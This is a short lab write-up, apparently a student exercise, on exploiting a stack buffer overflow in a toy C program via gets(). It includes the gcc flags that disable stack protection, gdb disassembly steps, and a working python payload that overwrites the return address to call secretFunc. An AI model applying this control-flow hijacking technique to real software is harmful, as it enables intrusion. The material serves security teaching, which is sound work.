# Understand bof1.c 
In this attack, we will try to replace the return address with another function's return address (redirect control) by using python!
## stackframe

## Vulnerbility
At "gets(array)"; function, we see that hackers can exploit the stackframe by adding more bytes in python in order to redirect the return address! 
# Start attacking bof1.c 
## Compiling the file without stack restriction
`gcc -g bof1.c -o bof1.out -fno-stack-protector -mpreferred-stack-boundary=2`  
![alt text](image-1.png)
## Run gdb for futher examination
`gdb bof1.out`  
![alt text](image-2.png)
## Try to see each func in machine code!
With **vuln**: `disas vuln` 
![alt text](image-3.png)  
With **secretFunc**: `disas secretFunc`  
![alt text](image-4.png)  
=> We see that the address of  **secretFunc** is `0x0804846b`. So now, we are going to replace the **vuln's return address** with the **secretFunc's return address**.
## Calculate the total bytes to attack
As can be seen from the stackframe, we need in sum of 204 bytes of a and the last will be the return address of **secretFunc**  
Now we use `q` to exit and type `echo $(python -c "print('a'*204+'\x6b\x84\x04\x08')") | ./bof1.out 123` to see the result!  
![alt text](image-5.png)
